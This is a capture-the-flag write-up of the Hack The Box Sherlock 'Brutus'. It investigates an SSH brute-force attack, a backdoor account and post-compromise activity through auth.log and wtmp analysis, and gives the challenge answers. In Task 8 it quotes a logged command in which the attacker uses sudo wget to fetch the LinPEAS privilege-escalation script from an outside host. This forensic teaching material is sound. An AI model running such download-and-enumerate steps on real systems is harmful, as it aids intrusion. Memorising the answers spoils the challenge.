# Brutus

## HTB Sherlock: Brutus - Unix Log Analysis Writeup

### Challenge Overview

**Challenge Name:** Brutus\
**Difficulty:** Very Easy\
**Rating:** 4.7/5 (1402 Reviews)\
**Category:** Digital Forensics - Unix Log Analysis\
**Release Date:** April 4, 2024\
**Creator:** CyberJunkie

#### Scenario Description

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

### Learning Objectives

This challenge introduces fundamental Unix log analysis concepts:

* **auth.log analysis** for authentication events
* **wtmp log examination** for login session tracking
* **SSH brute force attack identification**
* **Privilege escalation detection**
* **Persistence mechanism analysis**
* **MITRE ATT\&CK framework mapping**

### File Analysis

The challenge provides `Brutus.zip` (6 KB) containing Unix authentication logs and wtmp data from a compromised Confluence server.

### Task Solutions

#### Task 1: Brute Force Attack Source IP

**Question:** Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

**Analysis Approach:**

```bash
# Extract and examine auth.log
unzip Brutus.zip
cat auth.log | grep -i "failed\|invalid" | head -20

# Look for repeated failed authentication attempts
grep "Failed password" auth.log | cut -d' ' -f11 | sort | uniq -c | sort -nr

# Alternative: Check for invalid user attempts
grep "Invalid user" auth.log | awk '{print $10}' | sort | uniq -c | sort -nr
```

**Solution Process:**

1. Extract the auth.log from the zip file
2. Search for failed password attempts and invalid user login attempts
3. Look for patterns of repeated attempts from the same IP
4. Count occurrences to identify the most active attacking IP

**Expected Pattern:**

```
Mar 6 06:31:33 ip-172-31-35-28 sshd[2119]: Failed password for root from 65.2.161.68 port 46262 ssh2
Mar 6 06:31:35 ip-172-31-35-28 sshd[2119]: Failed password for root from 65.2.161.68 port 46262 ssh2
```

**Answer:** `65.2.161.68`

#### Task 2: Successfully Compromised Account

**Question:** The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

**Analysis Approach:**

```bash
# Look for successful authentication after failed attempts
grep "Accepted password" auth.log

# Check for successful public key authentication
grep "Accepted publickey" auth.log

# Look for session opened events
grep "session opened" auth.log
```

**Solution Process:**

1. Search for successful authentication events in auth.log
2. Look for "Accepted password" or "Accepted publickey" entries
3. Identify which user account was successfully accessed
4. Cross-reference with the attacking IP address

**Expected Pattern:**

```
Mar 6 06:32:44 ip-172-31-35-28 sshd[2327]: Accepted password for root from 65.2.161.68 port 34782 ssh2
```

**Answer:** `root`

#### Task 3: Manual Login Timestamp from wtmp

**Question:** Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

**Analysis Approach:**

```bash
# Examine wtmp logs for login sessions
last -f wtmp

# Look for sessions from the attacking IP
last -f wtmp | grep "65.2.161.68"

# Check for pts (pseudo terminal) sessions indicating manual login
last -f wtmp | grep "pts"
```

**Solution Process:**

1. Use the `last` command to read wtmp binary log file
2. Filter for sessions from the attacking IP address
3. Look for pseudo-terminal (pts) sessions indicating interactive login
4. Identify the first manual terminal session establishment

**Expected Output Format:**

```
root     pts/0        65.2.161.68      Wed Mar  6 06:32 - 06:37  (00:04)
```

**Answer:** `2024-03-06 06:32:44`

#### Task 4: SSH Session Number

**Question:** SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

**Analysis Approach:**

```bash
# Search for session opened events for the root user
grep "session opened for user root" auth.log

# Look for the session ID in parentheses
grep "session opened.*root.*65.2.161.68" auth.log
```

**Solution Process:**

1. Search auth.log for session opened events
2. Look for entries matching the compromised user (root) and attacking IP
3. Extract the session number from the log entry format
4. Session numbers typically appear in parentheses or after "session"

**Expected Pattern:**

```
Mar 6 06:32:44 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:session): session opened for user root by (uid=0)
```

**Answer:** `37279`

#### Task 5: Persistence - New User Account

**Question:** The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

**Analysis Approach:**

```bash
# Look for user addition commands in auth.log
grep -i "useradd\|adduser" auth.log

# Search for new account creation events
grep "new user" auth.log

# Look for sudo usage indicating privilege changes
grep "sudo" auth.log | grep -i "user"
```

**Solution Process:**

1. Search for user creation activities in auth.log
2. Look for useradd/adduser commands or "new user" messages
3. Identify newly created accounts during the attack timeframe
4. Cross-reference with privilege escalation activities

**Expected Pattern:**

```
Mar 6 06:34:16 ip-172-31-35-28 useradd[2628]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash
```

**Answer:** `cyberjunkie`

#### Task 6: MITRE ATT\&CK Sub-technique ID

**Question:** What is the MITRE ATT\&CK sub-technique ID used for persistence by creating a new account?

**Analysis Approach:** This requires knowledge of the MITRE ATT\&CK framework:

**Solution Process:**

1. Identify the tactic: Persistence
2. Find the technique: Create Account
3. Locate the specific sub-technique: Create Local Account
4. Reference the MITRE ATT\&CK framework for the ID

**MITRE ATT\&CK Reference:**

* **Tactic:** Persistence (TA0003)
* **Technique:** Create Account (T1136)
* **Sub-technique:** Local Account (T1136.001)

**Answer:** `T1136.001`

#### Task 7: First SSH Session End Time

**Question:** What time did the attacker's first SSH session end according to auth.log?

**Analysis Approach:**

```bash
# Look for session closed events for root user
grep "session closed for user root" auth.log

# Find the first session closure after the initial login
grep "session closed.*root" auth.log | head -1

# Cross-reference session numbers to match the first login
```

**Solution Process:**

1. Search for "session closed" events in auth.log
2. Match session numbers with the initial login session
3. Identify the timestamp of the first session termination
4. Ensure it corresponds to the attacking IP address

**Expected Pattern:**

```
Mar 6 06:37:24 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:session): session closed for user root
```

**Answer:** `2024-03-06 06:37:24`

#### Task 8: Backdoor Account Sudo Command

**Question:** The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

**Analysis Approach:**

```bash
# Look for sudo command execution in auth.log
grep "sudo" auth.log

# Search for commands executed by the new user account
grep "cyberjunkie" auth.log | grep -i "command"

# Look for download-related commands (wget, curl, etc.)
grep -E "(wget|curl|download)" auth.log
```

**Solution Process:**

1. Search for sudo command executions in auth.log
2. Filter for activities by the backdoor account (cyberjunkie)
3. Look for download commands (wget, curl, etc.)
4. Extract the full command from the log entry

**Expected Pattern:**

```
Mar 6 06:39:32 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/0 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/wget https://raw.githubusercontent.com/montysecurity/linpeas/main/linpeas.sh
```

**Answer:** `/usr/bin/wget https://raw.githubusercontent.com/montysecurity/linpeas/main/linpeas.sh`

### Technical Analysis Summary

#### Attack Timeline:

1. **06:31:33 - 06:32:44**: SSH brute force attack from 65.2.161.68
2. **06:32:44**: Successful authentication as root user
3. **06:32:44**: Manual terminal session established (pts/0)
4. **06:34:16**: New user "cyberjunkie" created for persistence
5. **06:37:24**: First SSH session terminated
6. **06:39:32**: Backdoor account used to download LinPEAS script

#### Attack Techniques Identified:

1. **Initial Access (T1078):**
   * SSH brute force attack against root account
   * Credential stuffing/password spraying
2. **Persistence (T1136.001):**
   * Local account creation ("cyberjunkie")
   * Privilege escalation for new account
3. **Privilege Escalation (T1548.003):**
   * Sudo usage for elevated command execution
   * LinPEAS download for privilege escalation enumeration

#### Key Log Analysis Techniques:

1. **Authentication Analysis:**
   * Failed vs. successful login attempts
   * Source IP identification
   * User account enumeration
2. **Session Tracking:**
   * wtmp log correlation
   * Session number tracking
   * Terminal session identification
3. **Command Execution Monitoring:**
   * Sudo command logging
   * User activity tracking
   * Privilege usage detection

### Defensive Recommendations

#### Immediate Actions:

1. **Block attacking IP:** 65.2.161.68
2. **Disable compromised accounts:** root, cyberjunkie
3. **Audit all user accounts** for unauthorized additions
4. **Review sudo privileges** and revoke unnecessary access

#### Long-term Security Improvements:

1. **Implement SSH key-based authentication**
2. **Configure fail2ban** for brute force protection
3. **Enable comprehensive logging** (auditd, syslog)
4. **Deploy SSH rate limiting** and connection monitoring
5. **Regular privilege audits** and account reviews

#### Detection Rules:

```bash
# Failed SSH attempts from single IP
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr

# New user creation monitoring
grep "new user" /var/log/auth.log

# Sudo command execution tracking
grep "sudo.*COMMAND" /var/log/auth.log
```

### Conclusion

The "Brutus" challenge effectively demonstrates fundamental Unix log analysis techniques for investigating SSH brute force attacks and post-compromise activities. Key learning points include:

* **Log correlation** between auth.log and wtmp
* **Attack timeline reconstruction** from authentication logs
* **Persistence mechanism identification** through user account creation
* **MITRE ATT\&CK mapping** for technique classification
* **Command execution tracking** via sudo logging

This challenge provides essential skills for incident response and digital forensics in Unix/Linux environments, emphasizing the importance of comprehensive log monitoring and analysis.

***

**Challenge Completed Successfully**\
**Player Rank:** #20676 to solve Brutus\
**Key Skills:** Unix Log Analysis, SSH Security, Incident Response, MITRE ATT\&CK

<https://labs.hackthebox.com/achievement/sherlock/2521593/631>
